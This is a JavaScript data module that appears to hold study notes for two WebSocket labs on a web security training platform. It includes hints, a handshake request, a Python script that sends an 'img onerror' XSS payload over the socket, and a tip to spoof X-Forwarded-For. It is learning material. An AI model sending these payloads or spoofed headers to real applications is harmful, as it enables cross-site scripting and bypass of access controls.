export default {
  'websockets-lab-manipulating-messages-to-exploit-vulnerabilities': {
    note: 'Chat messages are rendered without encoding; send an image payload over the socket to execute in other clients.',
    work: {
      hints: [
        'Open the chat, send a message, and inspect the WebSocket frame in Burp. It is JSON, not a form post.',
        'The server broadcasts the message and the client inserts it into the DOM. HTML is not encoded.',
        'Send `<img src=1 onerror=alert(1)>` as the message content; the simulated user\'s browser executes it.'
      ],
      approach:
        'The socket bypasses the HTTP form and its validation, but the client-side rendering sink is the same. Message-level input is untrusted input; the fact that it arrived over a persistent channel changes nothing about HTML encoding.',
      request: `GET /chat HTTP/1.1
Host: LAB-ID.web-security-academy.net
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Origin: https://LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION

→ {"message":"<img src=1 onerror=alert(1)>"}`,
      tokens: [
        ['Upgrade: websocket', 'Switches the connection from HTTP request/response to framed messages.'],
        ['Origin:', 'The only origin signal available to the server; it must validate it.'],
        ['Cookie:', 'Attached to the handshake, so the socket inherits the session.'],
        ['JSON message', 'Application protocol. The server parses `message` and broadcasts it.'],
        ['<img onerror>', 'Executes when the receiving client inserts the unencoded string into the DOM.']
      ],
      script: `import sys, json
from websocket import create_connection   # pip install websocket-client

host, session = sys.argv[1], sys.argv[2]
ws = create_connection(
    f"wss://{host}/chat",
    header=[f"Cookie: session={session}", f"Origin: https://{host}"]
)
ws.send(json.dumps({"message": "<img src=1 onerror=alert(1)>"}))
print(ws.recv())
ws.close()`
    }
  },
  'websockets-lab-manipulating-handshake-to-exploit-vulnerabilities': {
    note: 'The handshake trusts `X-Forwarded-For` for its IP block; spoof it, then exploit the same message sink.'
  }
}
